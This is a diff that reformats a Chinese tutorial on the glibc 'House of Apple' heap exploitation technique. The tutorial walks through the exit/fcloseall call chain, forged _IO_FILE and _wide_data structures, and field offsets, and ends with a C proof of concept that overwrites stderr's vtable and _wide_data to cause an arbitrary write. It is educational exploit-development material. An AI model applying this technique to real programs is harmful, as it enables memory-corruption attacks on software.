@@ -32,25 +32,11 @@
 
 
 ```
-
 exit
-
-
-└───►
-fcloseall
-
-
-└───►
-_IO_cleanup
-
-
-└───►
-_IO_flush_all_lockp
-
-
-└───►
-_IO_OVERFLOW
-
+   └───►fcloseall
+           └───►_IO_cleanup
+                      └───►_IO_flush_all_lockp
+                                     └───►_IO_OVERFLOW
 ```
 
 最后会遍历`_IO_list_all`存放的每一个`IO_FILE`结构体，如果满足条件，就会调用每个结构体中的`vatble->_overflow`函数指针指向的函数
@@ -58,121 +44,21 @@ _IO_OVERFLOW
 使用`larginbin attack`可以劫持`_IO_list_all`变量，将其替换为伪造的`IO_FILE`结构体，而在此时，我们可以继续利用某些`IO`流函数去修改其它地方的值
 
 
-```
-
-struct
-
-_IO_FILE_complete
-
+```asm
+struct _IO_FILE_complete
 {
-
-
-struct
-
-_IO_FILE
-
-_file
-;
-
-
-__off64_t
-
-_offset
-;
-
-
-/* Wide character stream stuff.  */
-
-
-struct
-
-_IO_codecvt
-
-*
-_codecvt
-;
-
-
-struct
-
-_IO_wide_data
-
-*
-_wide_data
-;
-
-// 劫持此变量
-
-
-struct
-
-_IO_FILE
-
-*
-_freeres_list
-;
-
-
-void
-
-*
-_freeres_buf
-;
-
-
-size_t
-
-__pad5
-;
-
-
-int
-
-_mode
-;
-
-
-/* Make sure we don't get into trouble again.  */
-
-
-char
-
-_unused2
-[
-15
-
-*
-
-sizeof
-
-(
-int
-)
-
--
-
-4
-
-*
-
-sizeof
-
-(
-void
-
-*
-)
-
--
-
-sizeof
-
-(
-size_t
-)];
-
+  struct _IO_FILE _file;
+  __off64_t _offset;
+  /* Wide character stream stuff.  */
+  struct _IO_codecvt *_codecvt;
+  struct _IO_wide_data *_wide_data; // 劫持此变量
+  struct _IO_FILE *_freeres_list;
+  void *_freeres_buf;
+  size_t __pad5;
+  int _mode;
+  /* Make sure we don't get into trouble again.  */
+  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
 };
-
 ```
 
 *`struct _IO_wide_data *_wide_data`在`_IO_FILE`中的偏移为`0xa0`*
@@ -180,242 +66,42 @@ size_t
 那么通过伪造`_wide_data`变量，然后通过某些函数，然后通过如`_IO_wstrn_overflow`就可以将已知地址空间上的某些值修改
 
 
-```
-
-static
-
-wint_t
-
-_IO_wstrn_overflow
-
-(
-FILE
-
-*
-fp
-,
-
-wint_t
-
-c
-)
-
+```c
+static wint_t
+_IO_wstrn_overflow (FILE *fp, wint_t c)
 {
-
-
-/* When we come to here this means the user supplied buffer is
-
+  /* When we come to here this means the user supplied buffer is
      filled.  But since we must return the number of characters which
-
      would have been written in total we must provide a buffer for
-
      further use.  We can do this by writing on and on in the overflow
-
      buffer in the _IO_wstrnfile structure.  */
-
-
-_IO_wstrnfile
-
-*
-snf
-
-=
-
-(
-_IO_wstrnfile
-
-*
-)
-
-fp
-;
-
-
-if
-
-(
-fp
-->
-_wide_data
-->
-_IO_buf_base
-
-!=
-
-snf
-->
-overflow_buf
-)
-
-
-{
-
-
-_IO_wsetb
-
-(
-fp
-,
-
-snf
-->
-overflow_buf
-,
-
-
-snf
-->
-overflow_buf
-
-+
-
-(
-sizeof
-
-(
-snf
-->
-overflow_buf
-)
-
-
-/
-
-sizeof
-
-(
-wchar_t
-)),
-
-0
-);
-
-
-fp
-->
-_wide_data
-->
-_IO_write_base
-
-=
-
-snf
-->
-overflow_buf
-;
-
-
-fp
-->
-_wide_data
-->
-_IO_read_base
-
-=
-
-snf
-->
-overflow_buf
-;
-
-
-fp
-->
-_wide_data
-->
-_IO_read_ptr
-
-=
-
-snf
-->
-overflow_buf
-;
-
-
-fp
-->
-_wide_data
-->
-_IO_read_end
-
-=
-
-(
-snf
-->
-overflow_buf
-
-
-+
-
-(
-sizeof
-
-(
-snf
-->
-overflow_buf
-)
-
-
-/
-
-sizeof
-
-(
-wchar_t
-)));
-
-
-}
-
-
-fp
-->
-_wide_data
-->
-_IO_write_ptr
-
-=
-
-snf
-->
-overflow_buf
-;
-
-
-fp
-->
-_wide_data
-->
-_IO_write_end
-
-=
-
-snf
-->
-overflow_buf
-;
-
-
-/* Since we are not really interested in storing the characters
-
+  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;
+
+  if (fp->_wide_data->_IO_buf_base != snf->overflow_buf)
+    {
+      _IO_wsetb (fp, snf->overflow_buf,
+         snf->overflow_buf + (sizeof (snf->overflow_buf)
+                      / sizeof (wchar_t)), 0);
+
+      fp->_wide_data->_IO_write_base = snf->overflow_buf;
+      fp->_wide_data->_IO_read_base = snf->overflow_buf;
+      fp->_wide_data->_IO_read_ptr = snf->overflow_buf;
+      fp->_wide_data->_IO_read_end = (snf->overflow_buf
+                      + (sizeof (snf->overflow_buf)
+                     / sizeof (wchar_t)));
+    }
+
+  fp->_wide_data->_IO_write_ptr = snf->overflow_buf;
+  fp->_wide_data->_IO_write_end = snf->overflow_buf;
+
+  /* Since we are not really interested in storing the characters
      which do not fit in the buffer we simply ignore it.  */
-
-
-return
-
-c
-;
-
+  return c;
 }
-
 ```
 
 
-```
-
+```mermaid
 flowchart LR
 
 A[调用 _IO_wstrn_overflow] --> B{缓冲区已满}
@@ -429,7 +115,6 @@ D --> E
 E --> F[设置 write_ptr == write_end<br/> → 写窗口为 0]
 F --> G[忽略实际写入]
 G --> Z[返回 c]
-
 ```
 
 此函数将`fp`强转伟`_IO_wstrnfile *`指针，然后判断`fp->_wide_data->_IO_buf_base!=snf->overflow_buf`是否成立；
@@ -446,144 +131,40 @@ G --> Z[返回 c]
 `_IO_wstrnfile`涉及到的结构体如下
 
 
-```
-
-struct
-
-_IO_str_fields
-
+```c
+struct _IO_str_fields
 {
-
-
-_IO_alloc_type
-
-_allocate_buffer_unused
-;
-
-
-_IO_free_type
-
-_free_buffer_unused
-;
-
+  _IO_alloc_type _allocate_buffer_unused;
+  _IO_free_type _free_buffer_unused;
 };
 
-struct
-
-_IO_streambuf
-
+struct _IO_streambuf
 {
-
-
-FILE
-
-_f
-;
-
-
-const
-
-struct
-
-_IO_jump_t
-
-*
-vtable
-;
-
+  FILE _f;
+  const struct _IO_jump_t *vtable;
 };
 
-typedef
-
-struct
-
-_IO_strfile_
-
+typedef struct _IO_strfile_
 {
+  struct _IO_streambuf _sbf;
+  struct _IO_str_fields _s;
+} _IO_strfile;
 
-
-struct
-
-_IO_streambuf
-
-_sbf
-;
-
-
-struct
-
-_IO_str_fields
-
-_s
-;
-
-}
-
-_IO_strfile
-;
-
-typedef
-
-struct
-
+typedef struct
 {
-
-
-_IO_strfile
-
-f
-;
-
-
-/* This is used for the characters which do not fit in the buffer
-
+  _IO_strfile f;
+  /* This is used for the characters which do not fit in the buffer
      provided by the user.  */
+  char overflow_buf[64];
+} _IO_strnfile;
 
-
-char
-
-overflow_buf
-[
-64
-];
-
-}
-
-_IO_strnfile
-;
-
-typedef
-
-struct
-
+typedef struct
 {
-
-
-_IO_strfile
-
-f
-;
-
-
-/* This is used for the characters which do not fit in the buffer
-
+  _IO_strfile f;
+  /* This is used for the characters which do not fit in the buffer
      provided by the user.  */
-
-
-wchar_t
-
-overflow_buf
-[
-64
-];
-
-// overflow_buf在这里
-
-}
-
-_IO_wstrnfile
-;
-
+  wchar_t overflow_buf[64]; // overflow_buf在这里
+} _IO_wstrnfile;
 ```
 
 其中，`overflow_buf[64]`相对于`_IO_FILE`结构体的偏移为`0xf0`，在`vtable`后面
@@ -591,159 +172,29 @@ _IO_wstrnfile
 `struct _IO_wide_data`结构体如下:
 
 
-```
-
-struct
-
-_IO_wide_data
-
+```c
+struct _IO_wide_data
 {
-
-
-wchar_t
-
-*
-_IO_read_ptr
-;
-
-/* Current read pointer */
-
-
-wchar_t
-
-*
-_IO_read_end
-;
-
-/* End of get area. */
-
-
-wchar_t
-
-*
-_IO_read_base
-;
-
-/* Start of putback+get area. */
-
-
-wchar_t
-
-*
-_IO_write_base
-;
-
-/* Start of put area. */
-
-
-wchar_t
-
-*
-_IO_write_ptr
-;
-
-/* Current put pointer. */
-
-
-wchar_t
-
-*
-_IO_write_end
-;
-
-/* End of put area. */
-
-
-wchar_t
-
-*
-_IO_buf_base
-;
-
-/* Start of reserve area. */
-
-
-wchar_t
-
-*
-_IO_buf_end
-;
-
-/* End of reserve area. */
-
-
-/* The following fields are used to support backing up and undo. */
-
-
-wchar_t
-
-*
-_IO_save_base
-;
-
-/* Pointer to start of non-current get area. */
-
-
-wchar_t
-
-*
-_IO_backup_base
-;
-
-/* Pointer to first valid character of
-
+  wchar_t *_IO_read_ptr;    /* Current read pointer */
+  wchar_t *_IO_read_end;    /* End of get area. */
+  wchar_t *_IO_read_base;   /* Start of putback+get area. */
+  wchar_t *_IO_write_base;  /* Start of put area. */
+  wchar_t *_IO_write_ptr;   /* Current put pointer. */
+  wchar_t *_IO_write_end;   /* End of put area. */
+  wchar_t *_IO_buf_base;    /* Start of reserve area. */
+  wchar_t *_IO_buf_end;     /* End of reserve area. */
+  /* The following fields are used to support backing up and undo. */
+  wchar_t *_IO_save_base;   /* Pointer to start of non-current get area. */
+  wchar_t *_IO_backup_base; /* Pointer to first valid character of
                    backup area */
+  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */
 
-
-wchar_t
-
-*
-_IO_save_end
-;
-
-/* Pointer to end of non-current get area. */
-
-
-__mbstate_t
-
-_IO_state
-;
-
-
-__mbstate_t
-
-_IO_last_state
-;
-
-
-struct
-
-_IO_codecvt
-
-_codecvt
-;
-
-
-wchar_t
-
-_shortbuf
-[
-1
-];
-
-
-const
-
-struct
-
-_IO_jump_t
-
-*
-_wide_vtable
-;
-
+  __mbstate_t _IO_state;
+  __mbstate_t _IO_last_state;
+  struct _IO_codecvt _codecvt;
+  wchar_t _shortbuf[1];
+  const struct _IO_jump_t *_wide_vtable;
 };
-
 ```
 
 **总而言之**，如果在堆上伪造一个`_IO_FILE`结构体并已知其为地址`A`，将`A+0xd8`替换为`_IO_wstrn_jumps`地址，将`A+0xc0`设置为`B`，并设置其它成员以便能调用到`_IO_overflow`.`exit`函数则会一路调用到`` `_IO_wstrn_overflow ``函数，并将`B`至`B+0x38`的地址区域的内容都替换为`A+0xf0`或者`A+0x1f0`
@@ -756,216 +207,36 @@ _wide_vtable
 
 
 ```
-
-0x0
-:
-'
-_flags
-'
-,
-
-0x8
-:
-'
-_IO_read_ptr
-'
-,
-
-0x10
-:
-'
-_IO_read_end
-'
-,
-
-0x18
-:
-'
-_IO_read_base
-'
-,
-
-0x20
-:
-'
-_IO_write_base
-'
-,
-
-0x28
-:
-'
-_IO_write_ptr
-'
-,
-
-0x30
-:
-'
-_IO_write_end
-'
-,
-
-0x38
-:
-'
-_IO_buf_base
-'
-,
-
-0x40
-:
-'
-_IO_buf_end
-'
-,
-
-0x48
-:
-'
-_IO_save_base
-'
-,
-
-0x50
-:
-'
-_IO_backup_base
-'
-,
-
-0x58
-:
-'
-_IO_save_end
-'
-,
-
-0x60
-:
-'
-_markers
-'
-,
-
-0x68
-:
-'
-_chain
-'
-,
-
-0x70
-:
-'
-_fileno
-'
-,
-
-0x74
-:
-'
-_flags2
-'
-,
-
-0x78
-:
-'
-_old_offset
-'
-,
-
-0x80
-:
-'
-_cur_column
-'
-,
-
-0x82
-:
-'
-_vtable_offset
-'
-,
-
-0x83
-:
-'
-_shortbuf
-'
-,
-
-0x88
-:
-'
-_lock
-'
-,
-
-0x90
-:
-'
-_offset
-'
-,
-
-0x98
-:
-'
-_codecvt
-'
-,
-
-0xa0
-:
-'
-_wide_data
-'
-,
-
-0xa8
-:
-'
-_freeres_list
-'
-,
-
-0xb0
-:
-'
-_freeres_buf
-'
-,
-
-0xb8
-:
-'
-__pad5
-'
-,
-
-0xc0
-:
-'
-_mode
-'
-,
-
-0xc4
-:
-'
-_unused2
-'
-,
-
-0xd8
-:
-'
-vtable
-'
-
+0x0:'_flags',
+0x8:'_IO_read_ptr',
+0x10:'_IO_read_end',
+0x18:'_IO_read_base',
+0x20:'_IO_write_base',
+0x28:'_IO_write_ptr',
+0x30:'_IO_write_end',
+0x38:'_IO_buf_base',
+0x40:'_IO_buf_end',
+0x48:'_IO_save_base',
+0x50:'_IO_backup_base',
+0x58:'_IO_save_end',
+0x60:'_markers',
+0x68:'_chain',
+0x70:'_fileno',
+0x74:'_flags2',
+0x78:'_old_offset',
+0x80:'_cur_column',
+0x82:'_vtable_offset',
+0x83:'_shortbuf',
+0x88:'_lock',
+0x90:'_offset',
+0x98:'_codecvt',
+0xa0:'_wide_data',
+0xa8:'_freeres_list',
+0xb0:'_freeres_buf',
+0xb8:'__pad5',
+0xc0:'_mode',
+0xc4:'_unused2',
+0xd8:'vtable'
 ```
 
 那么顺序如下：
@@ -975,221 +246,30 @@ vtable
 可以修改`_IO_wstrn_jumps`结构体中的函数指针指向`_IO_wstrn_overflow`
 
 
-```
-
-static
-
-wint_t
-
-_IO_wstrn_overflow
-
-(
-FILE
-
-*
-fp
-,
-
-wint_t
-
-c
-)
-
+```c
+static wint_t
+_IO_wstrn_overflow (FILE *fp, wint_t c)
 {
+  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;
 
+  if (fp->_wide_data->_IO_buf_base != snf->overflow_buf)
+    {
+      _IO_wsetb (fp, snf->overflow_buf,
+         snf->overflow_buf + (sizeof (snf->overflow_buf)
+                      / sizeof (wchar_t)), 0);
 
-_IO_wstrnfile
+      fp->_wide_data->_IO_write_base = snf->overflow_buf;
+      fp->_wide_data->_IO_read_base = snf->overflow_buf;
+      fp->_wide_data->_IO_read_ptr = snf->overflow_buf;
+      fp->_wide_data->_IO_read_end = (snf->overflow_buf
+                      + (sizeof (snf->overflow_buf)
+                     / sizeof (wchar_t)));
+    }
 
-*
-snf
-
-=
-
-(
-_IO_wstrnfile
-
-*
-)
-
-fp
-;
-
-
-if
-
-(
-fp
-->
-_wide_data
-->
-_IO_buf_base
-
-!=
-
-snf
-->
-overflow_buf
-)
-
-
-{
-
-
-_IO_wsetb
-
-(
-fp
-,
-
-snf
-->
-overflow_buf
-,
-
-
-snf
-->
-overflow_buf
-
-+
-
-(
-sizeof
-
-(
-snf
-->
-overflow_buf
-)
-
-
-/
-
-sizeof
-
-(
-wchar_t
-)),
-
-0
-);
-
-
-fp
-->
-_wide_data
-->
-_IO_write_base
-
-=
-
-snf
-->
-overflow_buf
-;
-
-
-fp
-->
-_wide_data
-->
-_IO_read_base
-
-=
-
-snf
-->
-overflow_buf
-;
-
-
-fp
-->
-_wide_data
-->
-_IO_read_ptr
-
-=
-
-snf
-->
-overflow_buf
-;
-
-
-fp
-->
-_wide_data
-->
-_IO_read_end
-
-=
-
-(
-snf
-->
-overflow_buf
-
-
-+
-
-(
-sizeof
-
-(
-snf
-->
-overflow_buf
-)
-
-
-/
-
-sizeof
-
-(
-wchar_t
-)));
-
-
+  fp->_wide_data->_IO_write_ptr = snf->overflow_buf;
+  fp->_wide_data->_IO_write_end = snf->overflow_buf;
+  return c;
 }
-
-
-fp
-->
-_wide_data
-->
-_IO_write_ptr
-
-=
-
-snf
-->
-overflow_buf
-;
-
-
-fp
-->
-_wide_data
-->
-_IO_write_end
-
-=
-
-snf
-->
-overflow_buf
-;
-
-
-return
-
-c
-;
-
-}
-
 ```
 
 1. 这段代码中没有关于`fp->_wide_data`的合法检查。也就是如果可以控制`fp->_wide_data`，就可以让`snf->overflow_buf`这个地址写入到`fp->_wide_data->_IO_write_base`上；也即将`snf->overflow_buf`写到了`fp->_wide_data+0x20`处
@@ -1202,610 +282,64 @@ c
 不同的glibc版本偏移略有不同，可以自行尝试
 
 
-```
-
-#include
-<stdio.h>
-
-#include
-<stdlib.h>
-
-#include
-<stdint.h>
-
-#include
-<unistd.h>
-
-#include
-<string.h>
-
-void
-
-init
-()
-
-{
-
-
-setbuf
-(
-stdout
-,
-
-0
-);
-
-
-setbuf
-(
-stdin
-,
-
-0
-);
-
-
-setvbuf
-(
-stderr
-,
-
-0
-,
-
-2
-,
-
-0
-);
-
+```python
+#include<stdio.h>
+#include<stdlib.h>
+#include<stdint.h>
+#include<unistd.h>
+#include<string.h>
+void init() {
+    setbuf(stdout, 0);
+    setbuf(stdin, 0);
+    setvbuf(stderr, 0, 2, 0);
 }
 
-int
-
-main
-()
-
-{
-
-
-init
-();
-
-
-puts
-(
-"[+] allocate a 0x100 chunk"
-);
-
-
-size_t
-
-*
-p1
-
-=
-
-malloc
-(
-0xf0
-);
-
-
-size_t
-
-*
-tmp
-
-=
-
-p1
-;
-
-
-size_t
-
-old_value
-
-=
-
-0x114514
-;
-
-
-for
-
-(
-size_t
-
-i
-
-=
-
-0
-;
-
-i
-
-<
-
-0x100
-
-/
-
-8
-;
-
-i
-++
-)
-
-{
-
-
-p1
-[
-i
-]
-
-=
-
-old_value
-;
-
-
+int main() {
+    init();
+    puts("[+] allocate a 0x100 chunk");
+    size_t *p1 = malloc(0xf0);
+    size_t *tmp = p1;
+    size_t old_value = 0x114514;
+    for (size_t i = 0; i < 0x100 / 8; i++) {
+        p1[i] = old_value;
+    }
+    puts("【old value】");
+    for (size_t i = 0; i < 4; i++) {
+        printf("【-】[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
+        tmp += 2;
+    }
+    puts("");
+    size_t puts_addr = (size_t)&puts;
+    printf("【-】 puts address: %p\n", (void *)puts_addr);
+    size_t stderr_write_ptr_addr = puts_addr + 0x1997b8 + 0x10c0;
+    printf("【-】 stderr->_IO_write_ptr address: %p\n", (void*)stderr_write_ptr_addr);
+    size_t stderr_flags2_addr = puts_addr + 0x199804 + 0x10c0;
+    printf("【-】 stderr->_flags2 address: %p\n", (void *)stderr_flags2_addr);
+    size_t stderr_wide_data_addr = puts_addr + 0x199830 + 0x10c0;
+    printf("【-】 stderr->_wide_data address: %p\n", (void *)stderr_wide_data_addr);
+    size_t sdterr_vtable_addr = puts_addr + 0x199868 + 0x10c0;
+    printf("【-】 stderr->vtable address: %p\n", (void *)sdterr_vtable_addr);
+    size_t _IO_wstrn_jumps_addr = puts_addr + 0x194f70;
+    printf("【-】 _IO_wstrn_jumps address: %p\n", (void *)_IO_wstrn_jumps_addr);
+    puts("");
+    puts("[+] change stderr->_IO_write_pte to -1");
+    *(size_t *)stderr_write_ptr_addr = (size_t)-1;
+    puts("[+] change stderr->_flags2 to 8");
+    *(size_t *)stderr_flags2_addr = 8;
+    puts("[+] replace stderr->_wide_data with the allocated chunk");
+    *(size_t *)stderr_wide_data_addr = (size_t)p1;
+    puts("[+] replace stderr->vtable with _IO_wstrn_jumps");
+    *(size_t *)sdterr_vtable_addr = (size_t)_IO_wstrn_jumps_addr;
+    puts("[+] call fcloseall and trigger house of apple");
+    fcloseall();
+    tmp = p1;
+    puts("【new value】");
+    for (size_t i = 0; i < 4; i++) {
+        printf("【-】[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
+        tmp += 2;
+    }
+    return 0;
 }
-
-
-puts
-(
-"【old value】"
-);
-
-
-for
-
-(
-size_t
-
-i
-
-=
-
-0
-;
-
-i
-
-<
-
-4
-;
-
-i
-++
-)
-
-{
-
-
-printf
-(
-"【-】[%p]: 0x%016lx  0x%016lx
-\n
-"
-,
-
-tmp
-,
-
-tmp
-[
-0
-],
-
-tmp
-[
-1
-]);
-
-
-tmp
-
-+=
-
-2
-;
-
-
-}
-
-
-puts
-(
-""
-);
-
-
-size_t
-
-puts_addr
-
-=
-
-(
-size_t
-)
-&
-puts
-;
-
-
-printf
-(
-"【-】 puts address: %p
-\n
-"
-,
-
-(
-void
-
-*
-)
-puts_addr
-);
-
-
-size_t
-
-stderr_write_ptr_addr
-
-=
-
-puts_addr
-
-+
-
-0x1997b8
-
-+
-
-0x10c0
-;
-
-
-printf
-(
-"【-】 stderr->_IO_write_ptr address: %p
-\n
-"
-,
-
-(
-void
-*
-)
-stderr_write_ptr_addr
-);
-
-
-size_t
-
-stderr_flags2_addr
-
-=
-
-puts_addr
-
-+
-
-0x199804
-
-+
-
-0x10c0
-;
-
-
-printf
-(
-"【-】 stderr->_flags2 address: %p
-\n
-"
-,
-
-(
-void
-
-*
-)
-stderr_flags2_addr
-);
-
-
-size_t
-
-stderr_wide_data_addr
-
-=
-
-puts_addr
-
-+
-
-0x199830
-
-+
-
-0x10c0
-;
-
-
-printf
-(
-"【-】 stderr->_wide_data address: %p
-\n
-"
-,
-
-(
-void
-
-*
-)
-stderr_wide_data_addr
-);
-
-
-size_t
-
-sdterr_vtable_addr
-
-=
-
-puts_addr
-
-+
-
-0x199868
-
-+
-
-0x10c0
-;
-
-
-printf
-(
-"【-】 stderr->vtable address: %p
-\n
-"
-,
-
-(
-void
-
-*
-)
-sdterr_vtable_addr
-);
-
-
-size_t
-
-_IO_wstrn_jumps_addr
-
-=
-
-puts_addr
-
-+
-
-0x194f70
-;
-
-
-printf
-(
-"【-】 _IO_wstrn_jumps address: %p
-\n
-"
-,
-
-(
-void
-
-*
-)
-_IO_wstrn_jumps_addr
-);
-
-
-puts
-(
-""
-);
-
-
-puts
-(
-"[+] change stderr->_IO_write_pte to -1"
-);
-
-
-*
-(
-size_t
-
-*
-)
-stderr_write_ptr_addr
-
-=
-
-(
-size_t
-)
--1
-;
-
-
-puts
-(
-"[+] change stderr->_flags2 to 8"
-);
-
-
-*
-(
-size_t
-
-*
-)
-stderr_flags2_addr
-
-=
-
-8
-;
-
-
-puts
-(
-"[+] replace stderr->_wide_data with the allocated chunk"
-);
-
-
-*
-(
-size_t
-
-*
-)
-stderr_wide_data_addr
-
-=
-
-(
-size_t
-)
-p1
-;
-
-
-puts
-(
-"[+] replace stderr->vtable with _IO_wstrn_jumps"
-);
-
-
-*
-(
-size_t
-
-*
-)
-sdterr_vtable_addr
-
-=
-
-(
-size_t
-)
-_IO_wstrn_jumps_addr
-;
-
-
-puts
-(
-"[+] call fcloseall and trigger house of apple"
-);
-
-
-fcloseall
-();
-
-
-tmp
-
-=
-
-p1
-;
-
-
-puts
-(
-"【new value】"
-);
-
-
-for
-
-(
-size_t
-
-i
-
-=
-
-0
-;
-
-i
-
-<
-
-4
-;
-
-i
-++
-)
-
-{
-
-
-printf
-(
-"【-】[%p]: 0x%016lx  0x%016lx
-\n
-"
-,
-
-tmp
-,
-
-tmp
-[
-0
-],
-
-tmp
-[
-1
-]);
-
-
-tmp
-
-+=
-
-2
-;
-
-
-}
-
-
-return
-
-0
-;
-
-}
-
 ```
 
 
